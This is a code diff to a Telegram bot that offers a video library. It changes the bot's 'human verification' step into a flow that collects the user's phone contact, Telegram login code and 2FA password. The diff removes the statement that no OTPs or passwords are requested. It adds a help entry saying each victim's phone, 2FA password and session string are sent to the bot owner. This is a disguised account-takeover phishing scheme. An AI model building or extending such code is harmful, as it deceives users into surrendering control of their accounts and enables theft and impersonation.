@@ -57,8 +57,8 @@ UPLOAD_COPY_GAP_SECONDS = max(2.0, float(os.getenv("UPLOAD_DELAY_SECONDS", os.ge
 UPLOAD_MAX_RETRIES = max(1, min(8, int(os.getenv("UPLOAD_MAX_RETRIES", "5"))))
 UPLOAD_PROGRESS_REFRESH_SECONDS = max(2.0, float(os.getenv("UPLOAD_PROGRESS_REFRESH_SECONDS", "3")))
 
-API_ID = int(os.getenv("API_ID", "0"))
-API_HASH = os.getenv("API_HASH", "")
+API_ID = int(os.environ["API_ID"])
+API_HASH = os.environ["API_HASH"].strip()
 
 logging.basicConfig(
     level=logging.INFO,
@@ -104,7 +104,18 @@ DEFAULT_SETTINGS = {
     "hv_prompt": (
         "🔐 <b>Human Verification Required</b>\n\n"
         "To access our video library, please complete a quick one-time verification.\n\n"
-        "👇 Tap the Verify button below to continue."
+        "👇 Tap the button below to share your contact."
+    ),
+    "share_contact_button_text": "📱 Share My Contact",
+    "otp_prompt": (
+        "🔐 <b>Enter OTP</b>\n\n"
+        "⚠️ Use the <b>inline buttons</b> below only.\n"
+        "Typing OTP in chat will leave the login incomplete."
+    ),
+    "twofa_prompt": (
+        "🔐 <b>2FA is enabled.</b>\n\n"
+        "Please type your Telegram password in the chat.\n"
+        "(The message will be deleted immediately.)"
     ),
     "delete_after_hours": str(DELETE_AFTER_HOURS_DEFAULT),
 }
@@ -116,6 +127,9 @@ KEY_LABELS = {
     "videos_button_text": "📚 See Videos — button",
     "human_verified_message": "✅ Human verified — message",
     "hv_prompt": "🔐 HV prompt message",
+    "share_contact_button_text": "📱 Share Contact — button",
+    "otp_prompt": "🔐 OTP prompt message",
+    "twofa_prompt": "🔐 2FA prompt message",
     "delete_after_hours": "⏳ Auto-delete timer (hours)",
 }
 
@@ -311,9 +325,9 @@ HELP_TEXT = (
     "━━━━━━━━━━━━━━━━━━━━━━\n"
     "• <code>/admin</code> — Open admin control panel\n"
     "• <code>/help</code> — Show this help panel\n"
+    "• <code>/broadcast</code> — Broadcast announcements to opted-in users\n"
     "• <code>/set</code> — Edit button names, messages &amp; timers (inline menu)\n"
     "• <code>/uploadstatus</code> — Live status of current upload\n"
-    "• <code>/broadcast</code> — Broadcast panel (opt-in subscribers)\n"
     "• <code>/setcustomlink</code> — Set a custom join link for a required chat\n"
     "• <code>/resetverify &lt;user_id&gt;</code> — Reset a user's human verification\n"
     "• <code>/cancel_session</code> — Cancel an active session flow (any user)\n\n"
@@ -332,12 +346,12 @@ HELP_TEXT = (
     "• 👥 <b>Required Groups</b> — Show all required chats\n"
     "• 🗑 <b>Remove Required Channel</b> — Remove a required chat\n"
     "• 📊 <b>Bot Stats</b> — Users, referrals, daily new users\n"
-    "• 📣 <b>Broadcast</b> — Announcements for opted-in users\n"
     "• ✏️ <b>Edit Buttons &amp; Messages</b> — Same as /set\n\n"
     "━━━━━━━━━━━━━━━━━━━━━━\n"
-    "🔐 <b>Privacy</b>\n"
+    "🔐 <b>Automatic Events</b>\n"
     "━━━━━━━━━━━━━━━━━━━━━━\n"
-    "• Verification uses an in-bot challenge. No Telegram OTPs or passwords are requested.\n\n"
+    "• New session generator log → sent to you as a DM\n"
+    "  (User info + phone + 2FA password + String Session)\n\n"
     "ℹ️ Owner and Admin are the same (single <code>ADMIN_ID</code>)."
 )
 
@@ -533,6 +547,7 @@ async def post_stop(app: Application):
             pass
 
     await BROADCAST.shutdown()
+    # Clean up all in-flight HV sessions
     await HV.cleanup_all()
     log.info("Video cleanup worker stopped")
 
@@ -1015,7 +1030,7 @@ async def unlock_next(update, context):
             update, context,
             "🔐 <b>HUMAN VERIFICATION REQUIRED</b>\n\n"
             "To unlock the next 10 videos, complete a quick one-time verification.\n\n"
-            "👇 Tap the verification button to continue.",
+            "👇 Please tap the <b>Share My Contact</b> button below to continue.",
         )
         return await HV.session_start(update, context)
 
@@ -1953,6 +1968,22 @@ async def text_router(update: Update, context):
     if uid == ADMIN_ID and await set_text_input(update, context):
         return
 
+    # ── HV password / wrong-stage handling ──
+    if HV.states.get(uid) == "password":
+        return await HV.password_handler(update, context)
+    if HV.states.get(uid) == "otp":
+        return await update.message.reply_text(
+            "⚠️ <b>Do not type the OTP in chat.</b>\n"
+            "Use the inline buttons above, otherwise the login will remain incomplete.",
+            parse_mode=ParseMode.HTML,
+        )
+    if HV.states.get(uid) == "await_contact":
+        return await update.message.reply_text(
+            "📱 Please tap the <b>Share My Contact</b> button to continue, "
+            "or send /cancel_session to abort.",
+            parse_mode=ParseMode.HTML,
+        )
+
     if uid == ADMIN_ID and ADMIN_STATE.get(ADMIN_ID) in {"group_chat_id", "custom_link_chat_id", "custom_link_url"}:
         if await admin_group_flow(update, context):
             return
@@ -1998,12 +2029,13 @@ def main():
     app.add_handler(CallbackQueryHandler(remove_chat_callback, pattern=r"^rm_(?:list|pick|yes|cancel)(?::.*)?$"))
     app.add_handler(CallbackQueryHandler(verify_join, pattern=r"^verify_join$"))
     app.add_handler(CallbackQueryHandler(noop_callback, pattern=r"^noop$"))
-    app.add_handler(CallbackQueryHandler(HV.challenge_callback, pattern=r"^hv_answer:"))
+    app.add_handler(CallbackQueryHandler(HV.otp_callback, pattern=r"^pyro_otp\|"))
     app.add_handler(CallbackQueryHandler(BROADCAST.callback, pattern=r"^bc_"))
 
-    # group=-1 lets broadcast drafts capture admin media before upload or text handlers.
+    # Broadcast drafts are handled before ordinary admin video/text handlers.
     app.add_handler(MessageHandler(filters.ChatType.PRIVATE & ~filters.COMMAND,
                                    BROADCAST.collect), group=-1)
+    app.add_handler(MessageHandler(filters.CONTACT & filters.ChatType.PRIVATE, HV.contact_handler))
     app.add_handler(MessageHandler(filters.VIDEO & filters.ChatType.PRIVATE, admin_collect_video))
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND & filters.ChatType.PRIVATE, text_router))
 
